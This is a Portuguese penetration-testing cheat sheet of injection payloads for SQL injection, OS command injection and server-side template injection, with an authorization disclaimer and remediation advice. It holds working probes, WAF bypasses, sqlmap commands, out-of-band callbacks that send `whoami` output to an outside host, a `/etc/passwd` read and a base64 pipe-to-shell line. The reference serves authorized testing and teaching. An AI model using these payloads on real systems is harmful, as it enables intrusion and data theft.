# Payloads de Injeção — SQLi, Command Injection e SSTI

> **USO AUTORIZADO.** Este material é referência para teste de penetração **autorizado por escrito** (escopo, RoE e janela acordados). Use payloads de **detecção/PoC mínima**. Não exfiltre dados reais além do necessário para provar o achado; prefira `version()`/`whoami`/markers benignos. Nunca rode em produção sem autorização explícita.

---

## 1. SQL Injection (SQLi)

### 1.1 Detecção rápida (sondas)
Injete em cada parâmetro (GET/POST/header/cookie/JSON) e observe diferença de comportamento.

```text
'                      → erro de sintaxe / 500 = candidato
"
`
')
';--
' OR '1'='1
1 OR 1=1
1' AND '1'='2        → resposta "falsa"
1' AND '1'='1        → resposta "verdadeira"
```

Diferença entre os dois últimos (mesma requisição, condição T vs F) = **SQLi booleana** confirmada.

### 1.2 Detecção baseada em erro (error-based)
```sql
' AND extractvalue(1,concat(0x7e,version()))-- -      -- MySQL
' AND 1=CAST((SELECT version()) AS int)-- -            -- PostgreSQL
' AND 1=CONVERT(int,(SELECT @@version))-- -            -- MSSQL
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -  -- MySQL double-query
```
**Sinal de sucesso:** a versão do SGBD aparece na mensagem de erro.

### 1.3 UNION-based (determinar nº de colunas e tipos)
```sql
' ORDER BY 1-- -        (incrementar até erro → nº de colunas)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT 1,version(),3-- -        -- MySQL/PG
' UNION SELECT 1,@@version,3-- -          -- MSSQL
' UNION SELECT banner,NULL FROM v$version-- -  -- Oracle
```
**Sinal:** dados do banco aparecem renderizados na página.

### 1.4 Blind booleana
```sql
' AND SUBSTRING(version(),1,1)='8'-- -
' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -
```
**Sinal:** página alterna entre dois estados conforme a condição (busca binária por caractere).

### 1.5 Blind por tempo (time-based)
```sql
'; WAITFOR DELAY '0:0:5'-- -                           -- MSSQL
' OR (SELECT 1 FROM (SELECT SLEEP(5))x)-- -            -- MySQL
' OR pg_sleep(5)-- -                                  -- PostgreSQL
' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -               -- PostgreSQL
' || dbms_pipe.receive_message(('a'),5)-- -           -- Oracle
```
**Sinal:** atraso de ~5s controlado pela injeção. Faça baseline e repita para descartar latência de rede.

### 1.6 Bypass comum de filtros
```text
Comentários:        /**/  --+  #  ;%00
Case/encoding:      SeLeCt, %53ELECT, CHAR(83)
Sem espaço:         /**/  %09  %0a  ()
Sem aspas:          0x61646d696e  (hex)  /  CHAR(97,100,...)
WAF:                'UNION/*!50000SELECT*/'  (MySQL inline comment)
```

### 1.7 Ferramenta (validação)
```bash
sqlmap -u 'https://alvo/item?id=1' --batch --level=3 --risk=2 --dbs
sqlmap -r request.txt --batch --technique=BEUST --random-agent
sqlmap -u '...' --tamper=space2comment,between --proxy=http://127.0.0.1:8080
```

### 1.8 Remediação
- **Prepared statements / queries parametrizadas** (binding) — defesa primária.
- ORM com parâmetros; nunca concatenar input em SQL.
- Validação por allowlist para identificadores que não podem ser bind (nomes de coluna/tabela, `ORDER BY`).
- Princípio do menor privilégio no usuário do banco (sem `FILE`, `DROP`, etc.).
- Mensagens de erro genéricas; desabilitar verbose errors em produção.
- WAF como camada adicional, nunca como controle único.

---

## 2. OS Command Injection

### 2.1 Detecção (separadores e PoC benigna)
```bash
; id
| id
|| id
& whoami
&& whoami
`id`
$(id)
%0a id            # newline injection
newline + id
```
Em parâmetros que viram argumento de comando, teste tanto inline quanto encadeado.

### 2.2 Blind (sem output) — confirmação por canal lateral
```bash
; ping -c 4 127.0.0.1            # time delay observável
& sleep 5 &                     # atraso controlado (UNIX)
| timeout 5                     # (Windows)
; nslookup $(whoami).oast.example   # OOB DNS (Burp Collaborator / interactsh)
; curl http://OAST/$(whoami)        # OOB HTTP
```
**Sinal de sucesso:** atraso controlado, ou callback DNS/HTTP no listener OOB autorizado.

### 2.3 Windows
```text
& whoami
&& systeminfo
| ver
%0a whoami
```

### 2.4 Bypass de filtros
```text
Espaço:        ${IFS}  <  $IFS$9   (ex.: cat${IFS}/etc/passwd)
Quoting:       w'h'o'a'mi   w"h"oami
Var expansion: /???/??t /???/p?sswd   (glob)
Base64:        echo BASE64|base64 -d|sh   (só com autorização explícita)
```

### 2.5 Remediação
- **Evitar chamar o shell.** Use APIs nativas da linguagem em vez de `system()`/`exec()`/`os.system`.
- Quando inevitável, use execução com array de argumentos (sem shell) e **allowlist** estrita de valores.
- Nunca passar input do usuário direto para o interpretador; escapar não é confiável.
- Drop de privilégios, sandbox/containers, seccomp.
- Monitorar saídas de rede inesperadas do app (detecta OOB).

### 2.6 OOB / detecção
```bash
interactsh-client                 # gera domínio para callbacks OOB
# ou Burp Suite Pro → Collaborator
```

---

## 3. Server-Side Template Injection (SSTI)

### 3.1 Detecção universal (fingerprint do engine)
Injete a sonda matemática e observe se é **avaliada**:
```text
${7*7}
{{7*7}}
#{7*7}
<%= 7*7 %>
{{7*'7'}}      → Jinja2 retorna 7777777 ; Twig retorna 49
```
**Sinal:** a resposta contém `49` (ou `7777777`) em vez do literal. Use a árvore de decisão:

```text
{{7*7}}=49 ─┬─ {{7*'7'}}=7777777 → Jinja2/Twig(py/php)
            └─ {{7*'7'}}=49      → Twig
${7*7}=49  ─── Freemarker / Velocity / Mako / Smarty (testar específicos)
#{7*7}=49  ─── Ruby ERB-like / Spring EL
```

### 3.2 PoC de confirmação por engine (mínima, não-destrutiva)
```text
# Jinja2 (Python) — confirmação de objeto interno, sem RCE:
{{ config }}
{{ self.__init__.__globals__ }}
{{ ''.__class__ }}

# Twig (PHP):
{{ _self }}
{{ dump(app) }}

# Freemarker (Java):
${product.getClass()}
<#assign x=1+1>${x}

# Velocity (Java):
#set($x=7*7)$x

# Smarty (PHP):
{$smarty.version}

# ERB (Ruby):
<%= 1+1 %>
```
**Sinal:** objetos internos do framework são refletidos = SSTI confirmado e explorável. Pare na prova de conceito; documente o vetor de RCE sem executar comandos destrutivos.

### 3.3 Remediação
- Nunca renderizar input do usuário como **template**; trate-o sempre como **dado** (variável passada ao contexto).
- Use sandbox do engine quando precisar de templates dinâmicos (ex.: `SandboxedEnvironment` do Jinja2) — com ressalvas de bypass conhecidas.
- Lógica de template fixa em arquivos; usuário só fornece valores.
- Validação/allowlist e separação de contexto de renderização.

---

## Apêndice — Pontos de injeção a sempre testar
- Parâmetros de query e corpo (form, JSON, XML, multipart).
- Headers: `User-Agent`, `Referer`, `X-Forwarded-For`, `Host`, `Cookie`.
- Campos "de confiança": filtros, ordenação, paginação, busca.
- Valores que reaparecem em logs, e-mails, PDFs (injeção stored/2ª ordem).
